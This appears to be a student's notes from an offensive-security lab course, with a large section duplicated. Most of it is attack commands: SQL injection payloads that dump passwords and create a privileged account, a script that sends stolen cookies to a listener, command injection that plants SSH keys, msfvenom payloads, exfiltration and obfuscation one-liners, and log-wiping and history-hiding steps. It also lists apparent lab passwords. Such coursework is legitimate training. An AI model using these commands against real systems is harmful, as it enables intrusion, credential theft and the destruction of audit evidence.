# SECURITY:


## WEB EXPLOITATION DAY 2 - SQL INJECTION: 
```
https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/05-sql-injection-slides.html
```
```
SELECT: Extracts data from a database

UNION: Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS

USE: Selects the DB to use

UPDATE: Updates data in a database

DELETE: Deletes data from a database

INSERT INTO: Inserts new data into a database

CREATE DATABASE: Creates a new database

ALTER DATABASE: Modifies a database

CREATE TABLE: Creates a new table

ALTER TABLE: Modifies a table

DROP TABLE: Deletes a table

CREATE INDEX: Creates an index (search key)

DROP INDEX: Deletes an index
```

SQL injection: 
```
Input fields can be found using a Single Quote --> '
Will return extraneous information

' closes a variable, to allow for additional statements/clauses

May show no errors or generic error (harder Injection)
Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
Server-Side Query Processing
User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
The Server-Side Query that would be passed to MySQL from PHP would be:

BEFORE INPUT:
SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
AFTER INPUT:
SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
Example - Injecting Your Statement
User enters TOM' OR 1='1 in the name and pass fields.


Truth Statement: tom ' OR 1='1


Server-Side query executed would appear like this:


SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
```
## Stacking Statements:
```
Chaining multiple statements together using a semi-colon ;
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
```
## Nesting statements
```
Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
Though they may allow for nesting a statement within an existing one:
php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
```
## Ignore the rest
```
Using # or -- tells the Database to ignore everything after

Server-Side Query:
SELECT product FROM item WHERE id = $select limit 1;

Input to Inject:
1 OR 1=1; #

Server-Side Query becomes:
SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
```
Blind Injection
```
Inlcudes Statements to determine how DB is configured

Columns in Output

Can we return errors

Can we return expected Output

Used when unsanitized fields give generic error or no messages



Normal Query to pull expected output:

php?item=4



Blind injection for validation:

php?item=4 OR 1=1



Try ALL combinations! ITEM=1, ITEM=2, ITEM=3, ETC.
```
Abuse The Client (GET METHOD):
```
Passing injection through the URL:

After the .PHP?ITEM=4 pass your UNION statement



prices.php?item=4 UNION SELECT 1,2



prices.php?item=4 UNION SELECT 1,2,@@version



What is @@VERSION?
```
Abuse The Client (Enum):
```
Identifying the schema leads to detailed queries to enumerate the DB



Research Database Schemas and what information they provide



php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()


What are INFORMATION_SCHEMA and DATABASE()?
```
```
SQL Injection (Database Enumeration):
DEMO: SQL Injection (Database Enumeration)
http://10.50.XX.XX/Union.html
Abuse The Client (Enum)
Identifying the schema leads to detailed queries to enumerate the DB

Defending Against
Validate inputs! Methods differ depending on software
CONCATENATE : turns inputs into single strings or escape characters
PHP: MYSQL_REAL_ESCAPE_STRING
SQL: SQLITE3_PREPARE()
```
```
2	JABL-503-M	nTtMzFJMeldqFBk	10.50.31.212     10.10.28.40/27 Jump box             10.50.39.26 (Linux opstation)             10.50.30.174(Windows opstation)





student@lin-ops:~$ ssh -MS /tmp/jump student@10.50.31.212
student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -D9050
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
proxychains nmap 192.168.28.97,98,100,105,111,120
proxychains nc 192.168.28.111 80 
proxychains nc 192.168.28.100 80
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80
 
firefox 127.0.0.1:1111

ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80 -L4444:192.168.28.111:22 (assuming that port 22 works and it is in fact ssh)

ssh -S /tmp/jump dummy -O cancel -L1111:192.168.28.100:80 (if you mess up you can cancel the socket file with this command)

ssh -MS /tmp/t1 student@127.0.0.1 -p 4444 (if this existed we verify that ssh existed we could ssh through port 4444, another socket file)

keep in mind user name and that -NT allows you to background it 




ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22

ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555


WHEN PORT 80 IS OPEN.
proxychains nmap --script=http-enum 192.168.28.100 Everytime that we are dealing with web stuff we use this command

check if there is robots.txt and inspect the source code.

proxychains nmap --script=smb-os-discovery.nse 192.168.150.225,226,227,245
/usr/share/nmap/scripts location


LINOPS----->JUMP------>TGTS

HTTP://10.50.20.30:8000/

GOOGLE: cybbh git security

for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done


1-PENETRATION TESTING OVERVIEW:

	ssh tunnels refresh:

	ssh student@172.16.0.66 -L 12299:192.168.0.1:22 (ports are open on 12299 on my workstation and 22 on the target, we are using redirector to pivot redir---->target).
	ssh localhost -p 12299 (this window will grant access to the 192.168.0.1 machine).

	Master sockets: 
	
	


	COOKIES: 
	File stored in a web server that saves user information preferences to smooth service every time user requests access to the server.
	
	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php

	nmap --script=http-nse.enum 192.168.24.160-------> /robots.txt helps to ennumerate the ip. Go on that page and see what is in there.
	once find the directories when can access to them.
	
	
	Stored XXS:
	
	python3 -m http.server (simulates storing XSS) 
	<script>document.location="http://10.50.39.26:8000/"+document.cookie;</script>

	Command Injection:
	
	System to ping 
	
	Run commands on box with a ; first.
	; cat /etc/passwd
	
	ssh-keygen -t rsa -b 4096 enter and y (It will regenerate all ssh keys, ssh keys are located on .ssh/id_rsa.pub for public, id_rsa for private)
	
	
	" > /var/www/.ssh/authorized_keys
	send it and cat /var/www/.ssh/authorized_keys the same exact file 
	
	ssh -i .ssh/id_rsa www-data@10.50.24.160

	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLE2261FZuDkbLynw1ADUrxmPlza3dmnNVwWSvgEO2o3p9Of/hfnzSL5dyXu985pVV0Aa9aTMlZJrCnbmZVaRE+8bQJL6jLqBB8Z+N26b6jggAm1xPYhsdfsNjfE1PKq/	neqVCyddV9loDOfLarY9MrIMcnlTK6DhVys/86XHni+5TFUsLcO7htIvrVcjyPcInnSdQ0iqJSifaiqZ6KJ4zveOrgk5K57nL8nHKIAEU016Ws+WBs0bVEXgzN/xNpWxO/yFhOy5nuI2pZI8aSIgDHc6FkwWHnNaDlTooyVeIHLXK6dUoUAcj7m3ptKUh2l67hih2Iw3SJDTJZ6YXLJ3eqvFpgmDPV0VxpTdJ63Pop7OVq7fU3xtMFiZ3MteF9O5FNFn/jh//pfZ03YqgF7zmbwcdYwVeN8Dq7r8rGaIZLTJ25V+whl+jYXwdxkIEsys66+A9nK5LP377noVulLvsxEGLDEW0QNTHaZLVKYj8mY40iBWJtW4E1m3l83/JhyYhskpLBXZendovcUu1mKsopU1nCQAtltGC7B7VPssqiCPJzaJuUgd2ChgRCwk6uLdL+oMWjTka9LxKf37ZcZ2Xb3sW6BYq3qf6jrIsQ8B65sNhETSlJY7WhgUusR+VKg8e


SQL-COMMANDS FOR ENNUMERATION:

mysql
show databases ;
SHOW tables FROM session ;
SHOW columns FROM session.Tires ;
SELECT tiresid,name,size,cost FROM session.Tires ;
show columns from session.car ;
SLECT tireid,name,cost,siza FROM session.Tires UNION SELECT carid,name,color,cost FROM session.car;


tom ' OR 1='1
tom ' OR 1='1

F12 
Network
POST METHOD 
REQUEST 
RAW
add ? after login.php and copy username string 
view page source 

copy all credentials once found


POST METHOD:
1. ID vulnerable field (in this case car brands)

2. Try all fields until you find the unsanitized field (Audi)

			Audi ' OR 1='

3.Identify columns:

			Audi ' UNION SELECT 1,2,3,4,5 #

4.Create Golden Statement:

			Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #


UNION SELECT table_schema,table_name,column_name FROM information_schema.columns


			Audi ' UNION SELECT <column>,<column>,<column>, FROM database.table #
			
5.Craft Query: Replace query with information we want to get 

			Audi ' UNION SELECT studentID,2,username,passwd, 5 FROM session.userinfo #
			Audi ' UNION SELECT 1,2,name,pass, 5 FROM session.user #

			
			
			
Cars we sell POST method
Ford

Dodge

Honda

Audi

Enter your selection ￼ ￼Submit


Tires we sell GET method
￼
Cooper-￼Submit




		THE GET METHOD:
		
		http://10.50.26.140/uniondemo.php?Selection=2 OR 1=1
		http://10.50.26.140/uniondemo.php?Selection=2 UNION SELECT 1,2,3

		?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
		
		?Selection=2 UNION SELECT id,pass,@@version FROM session.user
		
		
		
		
		Annotate databases, tables and columns: 
		Database: session
		
		Tables: Tires,car,session_log,user,userinfo
		
		other db
		Tbles: ,pre,infor,nation
		
		Columns
		(Tires) tireid,name,size,cost
		(car): carid,name,type,cost,color,year
		etc...

		delete from comments where ID  = 57 ;57 





http://127.0.0.1:3434/cases/productsCategory.php?category=1 UNION SELECT password,username 3 FROM sqlinjection.members


Input in all fields the one that does not show changes is the non validated one.
Play with the query to find where is the priviledge level at in this case is the last field 

http://127.0.0.1:3434/cases/productsCategory.php?category=1%20UNION%20SELECT%20password,username,%20permission%20FROM%20sqlinjection.members                  *shows the account creation live on SQL


INSERT INTO members (first_name, last_name, username, password, email, permission)
VALUES ('Hacker', 'Hacker', 'Hacker', '1', '1', 1)

Hacker','Hacker','Hacker', 1) # 

This will give us the output of  

INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', 'Hacker','Hacker','Hacker', 1) #', '1', '1', 3)           *We do not care what happens after the #


Register
Thank you Hacker','Hacker','Hacker', 1) # ! Your profile was created. 

log in after getting the register msg.


student@lin-ops:~/Downloads$ ls
entry.c  entry.exe
student@lin-ops:~/Downloads$ scp entry* student@10.50.30.174:C:
student@10.50.30.174's password: 
entry.c                                                                                                                                                                  100%  291   380.1KB/s   00:00    
entry.exe                                                                                                                                                                100%  111KB  71.4MB/s   00:00 





ssh -MS /tmp/jump student@10.50.31.212 to the JUMP 
ssh -S /tmp/jump dummy -O forward -D9050
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.111:2222


a.ssh comrade@localhost -p 1111
Create script form ~$ and run it on /.hidden dir sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)

b.scp -P 2222 ./inventory.exe comrade@127.0.0.1:.         #The dot will specify /home/comrade
scp script ensuring that if it has the same name it will be sent to a different directory.




comrade@web:~$ vim linbuffC.py
comrade@web:~$ ls
linbuffC.py
comrade@web:~$ cd /.hidden/
comrade@web:/.hidden$ sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)


```
```
SSH KEYS:

SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password

If you are able to find a users private ssh key it can potentially be used to gain access to other systems

Using Stolen SSH Keys
Bring private key to your own box

On your box:

chmod 600 /home/student/stolenkey

ssh -i /home/student/stolenkey jane@1.2.3.4

ssh as the user who is the original key owner
```
```
USER ENUMERATION:

	Windows net user 
	        tasklist /v 
	        tasklist /svc
	        ipconfig /all
	 	check the /tmp/backup.tar.gz
	
	Linux cat /etc/passwd /etc/host
	           ps -elf 
	           chkconfig 
	           systemctl --type=service 
                   ip a
                   
```
```
DATA EXFILTRATIONS:

Session Transcript
 ssh <user>@<host> | tee

Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64


Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>





scp <source> <destination>

## local to remote 
scp /path/to/file.txt student@10.50.XX.XX:/path/to/destination/file.txt


## remote to local 


scp student@10.50.xx.xx:/path/to/destination/file.txt /path/to/destination

ssh -MS  /tmp/jump dummy -O forward -L1111:192.168.28.XX:2222
scp -P 1111 creds@127.0.0.1:/path/to/file.txt . 
example  scp -P 1111 www-data@127.0.0.1:/tmp/backup.tar.gz . 




grep -R <service-name> /var/log

f
e0R3uOOlCOsLjj991uHK
```
```
----------------------------------Upload your ssh key to a box-------------------------------- 

1.Find out what account is running the web sever/commands.  ;whoami do not forget the ; if your trying command injection.

2.Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

 www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

3.Check to see if .ssh folder is in the users home directory. If not make it

 ls -la /var/www/.ssh      #check if .ssh exists
 mkdir /var/www/.ssh   #make .ssh in users home folder if it does not exist


get your public key from   cat ~/.ssh/id_rsa.pub
echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

run ; echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

----------------------------------------------------------------------------------------------
```
```
ENNUMERATION COMMANDS ON LINUX:

find /  -name "*inventory*"
cat /etc/hosts to finde the intranet
cat /etc/passwd
cat /etc/shadow

```
2	JABL-503-M  nTtMzFJMeldqFBk	10.50.31.212     10.10.28.40/27 Jump box             10.50.39.26 (Linux opstation)             10.50.30.174(Windows opstation)





student@lin-ops:~$ ssh -MS /tmp/jump student@10.50.31.212
student@lin-ops:~$ ssh -S /tmp/jump dummy -O forward -D9050
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
proxychains nmap 192.168.28.97,98,100,105,111,120
proxychains nc 192.168.28.111 80 
proxychains nc 192.168.28.100 80
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80
 
firefox 127.0.0.1:1111

ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.111:80 -L4444:192.168.28.111:22 (assuming that port 22 works and it is in fact ssh)

ssh -S /tmp/jump dummy -O cancel -L1111:192.168.28.100:80 (if you mess up you can cancel the socket file with this command)

ssh -MS /tmp/t1 student@127.0.0.1 -p 4444 (if this existed we verify that ssh existed we could ssh through port 4444, another socket file)

keep in mind user name and that -NT allows you to background it 




ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22

ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555


WHEN PORT 80 IS OPEN.
proxychains nmap --script=http-enum 192.168.28.100 Everytime that we are dealing with web stuff we use this command

check if there is robots.txt and inspect the source code.

proxychains nmap --script=smb-os-discovery.nse 192.168.150.225,226,227,245
/usr/share/nmap/scripts location


LINOPS----->JUMP------>TGTS

HTTP://10.50.20.30:8000/

GOOGLE: cybbh git security

for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done


1-PENETRATION TESTING OVERVIEW:

	ssh tunnels refresh:

	ssh student@172.16.0.66 -L 12299:192.168.0.1:22 (ports are open on 12299 on my workstation and 22 on the target, we are using redirector to pivot redir---->target).
	ssh localhost -p 12299 (this window will grant access to the 192.168.0.1 machine).

	Master sockets: 
	
	


	COOKIES: 
	File stored in a web server that saves user information preferences to smooth service every time user requests access to the server.
	
	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php

	nmap --script=http-nse.enum 192.168.24.160-------> /robots.txt helps to ennumerate the ip. Go on that page and see what is in there.
	once find the directories when can access to them.
	
	
	Stored XXS:
	
	python3 -m http.server (simulates storing XSS) 
	<script>document.location="http://10.50.39.26:8000/"+document.cookie;</script>

	Command Injection:
	
	System to ping 
	
	Run commands on box with a ; first.
	; cat /etc/passwd
	
	ssh-keygen -t rsa -b 4096 enter and y (It will regenerate all ssh keys, ssh keys are located on .ssh/id_rsa.pub for public, id_rsa for private)
	
	
	" > /var/www/.ssh/authorized_keys
	send it and cat /var/www/.ssh/authorized_keys the same exact file 
	
	ssh -i .ssh/id_rsa www-data@10.50.24.160

	ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDLE2261FZuDkbLynw1ADUrxmPlza3dmnNVwWSvgEO2o3p9Of/hfnzSL5dyXu985pVV0Aa9aTMlZJrCnbmZVaRE+8bQJL6jLqBB8Z+N26b6jggAm1xPYhsdfsNjfE1PKq/	neqVCyddV9loDOfLarY9MrIMcnlTK6DhVys/86XHni+5TFUsLcO7htIvrVcjyPcInnSdQ0iqJSifaiqZ6KJ4zveOrgk5K57nL8nHKIAEU016Ws+WBs0bVEXgzN/xNpWxO/yFhOy5nuI2pZI8aSIgDHc6FkwWHnNaDlTooyVeIHLXK6dUoUAcj7m3ptKUh2l67hih2Iw3SJDTJZ6YXLJ3eqvFpgmDPV0VxpTdJ63Pop7OVq7fU3xtMFiZ3MteF9O5FNFn/jh//pfZ03YqgF7zmbwcdYwVeN8Dq7r8rGaIZLTJ25V+whl+jYXwdxkIEsys66+A9nK5LP377noVulLvsxEGLDEW0QNTHaZLVKYj8mY40iBWJtW4E1m3l83/JhyYhskpLBXZendovcUu1mKsopU1nCQAtltGC7B7VPssqiCPJzaJuUgd2ChgRCwk6uLdL+oMWjTka9LxKf37ZcZ2Xb3sW6BYq3qf6jrIsQ8B65sNhETSlJY7WhgUusR+VKg8e


SQL-COMMANDS FOR ENNUMERATION:

mysql
show databases ;
SHOW tables FROM session ;
SHOW columns FROM session.Tires ;
SELECT tiresid,name,size,cost FROM session.Tires ;
show columns from session.car ;
SLECT tireid,name,cost,siza FROM session.Tires UNION SELECT carid,name,color,cost FROM session.car;


tom ' OR 1='1
tom ' OR 1='1

F12 
Network
POST METHOD 
REQUEST 
RAW
add ? after login.php and copy username string 
view page source 

copy all credentials once found


POST METHOD:
1. ID vulnerable field (in this case car brands)

2. Try all fields until you find the unsanitized field (Audi)

			Audi ' OR 1='

3.Identify columns:

			Audi ' UNION SELECT 1,2,3,4,5 #

4.Create Golden Statement:

			Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #


UNION SELECT table_schema,table_name,column_name FROM information_schema.columns


			Audi ' UNION SELECT <column>,<column>,<column>, FROM database.table #
			
5.Craft Query: Replace query with information we want to get 

			Audi ' UNION SELECT studentID,2,username,passwd, 5 FROM session.userinfo #
			Audi ' UNION SELECT 1,2,name,pass, 5 FROM session.user #

			
			
			
Cars we sell POST method
Ford

Dodge

Honda

Audi

Enter your selection ￼ ￼Submit


Tires we sell GET method
￼
Cooper-￼Submit




		THE GET METHOD:
		
		http://10.50.26.140/uniondemo.php?Selection=2 OR 1=1
		http://10.50.26.140/uniondemo.php?Selection=2 UNION SELECT 1,2,3

		?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
		
		?Selection=2 UNION SELECT id,pass,@@version FROM session.user
		
		
		
		
		Annotate databases, tables and columns: 
		Database: session
		
		Tables: Tires,car,session_log,user,userinfo
		
		other db
		Tbles: ,pre,infor,nation
		
		Columns
		(Tires) tireid,name,size,cost
		(car): carid,name,type,cost,color,year
		etc...

		delete from comments where ID  = 57 ;57 





http://127.0.0.1:3434/cases/productsCategory.php?category=1 UNION SELECT password,username 3 FROM sqlinjection.members


Input in all fields the one that does not show changes is the non validated one.
Play with the query to find where is the priviledge level at in this case is the last field 

http://127.0.0.1:3434/cases/productsCategory.php?category=1%20UNION%20SELECT%20password,username,%20permission%20FROM%20sqlinjection.members                  *shows the account creation live on SQL


INSERT INTO members (first_name, last_name, username, password, email, permission)
VALUES ('Hacker', 'Hacker', 'Hacker', '1', '1', 1)

Hacker','Hacker','Hacker', 1) # 

This will give us the output of  

INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', 'Hacker','Hacker','Hacker', 1) #', '1', '1', 3)           *We do not care what happens after the #


Register
Thank you Hacker','Hacker','Hacker', 1) # ! Your profile was created. 

log in after getting the register msg.


student@lin-ops:~/Downloads$ ls
entry.c  entry.exe
student@lin-ops:~/Downloads$ scp entry* student@10.50.30.174:C:
student@10.50.30.174's password: 
entry.c                                                                                                                                                                  100%  291   380.1KB/s   00:00    
entry.exe                                                                                                                                                                100%  111KB  71.4MB/s   00:00 





ssh -MS /tmp/jump student@10.50.31.212 to the JUMP 
ssh -S /tmp/jump dummy -O forward -D9050
ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.111:2222


a.ssh comrade@localhost -p 1111
Create script form ~$ and run it on /.hidden dir sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)

b.scp -P 2222 ./inventory.exe comrade@127.0.0.1:.         #The dot will specify /home/comrade
scp script ensuring that if it has the same name it will be sent to a different directory.




comrade@web:~$ vim linbuffC.py
comrade@web:~$ ls
linbuffC.py
comrade@web:~$ cd /.hidden/
comrade@web:/.hidden$ sudo ./inventory.exe <<<$(python /home/comrade/linbuffC.py)





 ssh -S /tmp/t1 dummy (COMMAND TO CHECK MS - CONNECTIONS)



xfreerdp /v:127.0.0.1:1122 /u:comrade /p:StudentPrivPassword /glyph-cache /dynamic-resolution /clipboard 


loook for passwd list on google
<john --wordlist:10000-passwordy passwordy> to crack with john 



------------------------------------------------------------------------------------------------------------------
# POST EXPLOITATION:
SSH KEYS:

SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password

If you are able to find a users private ssh key it can potentially be used to gain access to other systems

Using Stolen SSH Keys
Bring private key to your own box

On your box:

chmod 600 /home/student/stolenkey

ssh -i /home/student/stolenkey jane@1.2.3.4

ssh as the user who is the original key owner


USER ENUMERATION:

	Windows net user 
	        tasklist /v 
	        tasklist /svc
	        ipconfig /all
	 	check the /tmp/backup.tar.gz
	
	Linux cat /etc/passwd /etc/host
	           ps -elf 
	           chkconfig 
	           systemctl --type=service 
                   ip a
                   


DATA EXFILTRATIONS:

Session Transcript
 ssh <user>@<host> | tee

Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64


Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>





scp <source> <destination>

## local to remote 
scp /path/to/file.txt student@10.50.XX.XX:/path/to/destination/file.txt


## remote to local 


scp student@10.50.xx.xx:/path/to/destination/file.txt /path/to/destination

ssh -MS  /tmp/jump dummy -O forward -L1111:192.168.28.XX:2222
scp -P 1111 creds@127.0.0.1:/path/to/file.txt . 
example  scp -P 1111 www-data@127.0.0.1:/tmp/backup.tar.gz . 




grep -R <service-name> /var/log

f
e0R3uOOlCOsLjj991uHK


----------------------------------Upload your ssh key to a box-------------------------------- 

1.Find out what account is running the web sever/commands.  ;whoami do not forget the ; if your trying command injection.

2.Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

 www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

3.Check to see if .ssh folder is in the users home directory. If not make it

 ls -la /var/www/.ssh      #check if .ssh exists
 mkdir /var/www/.ssh   #make .ssh in users home folder if it does not exist


get your public key from   cat ~/.ssh/id_rsa.pub
echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

run ; echo "ssh-rsa... " >> /users/home/directory/.ssh/authorized_keys

----------------------------------------------------------------------------------------------

ENNUMERATION COMMANDS ON LINUX:

find /  -name "*inventory*"
cat /etc/hosts to finde the intranet
cat /etc/passwd
cat /etc/shadow


cat /etc    ls | grep "antivirus_name"  
cat /rsyslog.conf                        
var/spool/cron/crontab/             shceduled jobs 

----------------------------------------------------------------------------------------------------------------
# WINDOWS EXPLOITATION:

Windows Exploitation:   net use Z: https://live.sysinternals.com/ - cd Z:           C:\Program Files (x86)\Putty\Putty.exe

Open Services and check for automatic processes under file system x86 that may start upon boot
Check if local system user created it or not 
Go to path 
Check for creation permissions and access - if no access move on
Open procmon 
Filter - Process name - contains - putty.exe (example)


student@lin-ops:~$ ms Venom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll


(get-process | ? {$_.name -contains "putty"}).kill()





Create a crafted .exe program that will 


student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe





----------------------------------------------------------------------------------------------------------------
DEMO: Audit Logging   



Show all audit category settings:

auditpol /get /category:*



What does the below command show?

auditpol /get /category:* | findstr /i "success failure"



----------------------------------------------------------------------------------------------------------------


Important Microsoft Event IDs:

4624/4625   Successful/failed login

4720        Account created

4672	    Administrative user logged on

7045        Service created



msfvenom -l payloads 



scp student @x.x.x.x:/home/student/putty.exe C:\users\student\desktop


keep in mind that if we can create a file in the path in where we located that malicious or potentially escalable dll, this could be a good place to send our msfvenom scp tranfer

-----------------------------------------------------------------------------------------------------------------

# LINUX-EXPLOITATION:
Linux-Exploitation



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Dot"." in PATH:

When we wxwcute a command the system looks in all the different paths in where the command can be located and executes the first command it finds.

!#/usr/bin/env bash
echo "This is not the ping you are looking for"

chmod u+x (MAKE IT EXECUTABLE)
PATH= .:PATH
echo PATH

<which ping> in this dir will give us "This is not the ping you are looking for"

if we change dirs it will allow us to find the right ping
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
EXPLANATION TO THE ./ 
When we want to execute a binary we give a relative path to the script with a ./ the system needs to know where that script is at that is the reason we give a relative
oath to it.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
VULNERABLE SOFTWARE AND SERVICES:
If we find an unknown binary start messing with it and start giving it parameters to see what is doing. Check for possible file creation...
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PERSISTENCE:

Adding or Hijacking an User Account

Adding vs hijacking an user account.
User account considerations?
How should you access it?

We can create an user account without making too much noise or raising any red flags and give ourselves higher privileges than the standard user.

BOOT PROCESS PERSISTENCE:

Where and how do you implement?
Why should you consider it for persistence?
How should you access it?

CRON JOBS:

System vs user CRON
Why should you consider it for persistence?
How should you access it?

KERNEL MODULE BACKDOORS:

Why should you consider it for persistence?
How should you access it?

If you have access to the kernel you got access to that system.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
COVERIN YOUR TRACKS:

Familiarization with OS auditing and logging - Understand the tracks you are creating when recon/exploiting system.
Perform log cleaning and blending in - (Check JCAC coomands to delete logs and create a viable transfer)
Identify artifacts - Thigs we leave behind: tracks, user accounts created, files opened by any process we run, logs, file system metadata (Timestamps)...
 
PLAN:

Prior Initial Access? After Initial Access? Before Exit? (Know the system!)
What will happen if I do X (What logging?)
Checks (Where are things?)
Hide (File locations, names, times)
When do you start covering your tracks?




LOGS TIME CHANGE
awk '{print strftime("[%Y-%m-%d %H:%M:%S]"), $0}' /var/log/syslog  (Change log timestamps)
tail -n 10 /var/log/syslog | while read line; do echo "[$(date +'%Y-%m-%d %H:%M:%S')] $line"; done


CRON PATHS AND LOGS:
/etc/crontab: This file can include system-wide cron jobs that are run with root privileges.
/etc/cron.d/: This directory may contain additional cron job files managed by packages or services.
/etc/cron.daily/
/etc/cron.weekly/
/etc/cron.monthly/

crontab -e
crontab -l
sudo crontab -l -u username

CRON LOGS:
Cron jobs typically log their output to syslog, which can be viewed using /var/log/syslog, /var/log/cron, or /var/log/messages depending on the Linux distribution and configuration.


NIX-ism
First thing: unset HISTFILE
Need to be aware of of init system in use
SYSTEMV, upstart, SYSTEMD, to name a few
Determines what commands to use and logging structure


<ps -p 1> see your environment


SytemV - Out of scope 

SystemD
Utilzes journalctl
journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603


LOGS FOR COVERING TRACKS:
Logs typically housed in /var/log & useful logs:

auth.log/secure			Logins/authentications

lastlog				Each users' last successful login time

btmp					Bad login attempts

sulog					Usage of SU command

utmp					Currently logged in users (W command)

wtmp					Permanent record on user on/off


WORKING WITH LOGS:
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4

READING FILES:
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail

(Control your output with pipes | and more)

￼
￼Logs for Covering TracksLogs typically housed in /var/log & useful logs: auth.log/secureLogins/authenticationslastlogEach users' last successful login timebtmpBad login attemptssulogUsage of SU commandutmpCurrently logged in users (W command)wtmpPermanent record on user on/off

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
CLEANING THE LOGS:

Before we start cleaning, save the INODE!
Affect on the inode of using mv VS cp VS cat
Know what we are removing (Entry times? IP? Whole file? Etc.)






Cleaning The Logs (Basic)
Get rid of it (Lots of noise)

rm -rf /var/log/...

Clear It (Less noise)

cat /dev/null > /var/log/...
echo > /var/log/...



Cleaning The Logs (Precise) Always work off a backup!

GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2


SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log






---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
TIMESTOMP (NIX):
Access: updated when opened or used (grep, ls, cat, etc)
Modify: update content of file or saved
Change: file attribute change, file modified, moved, owner, permission
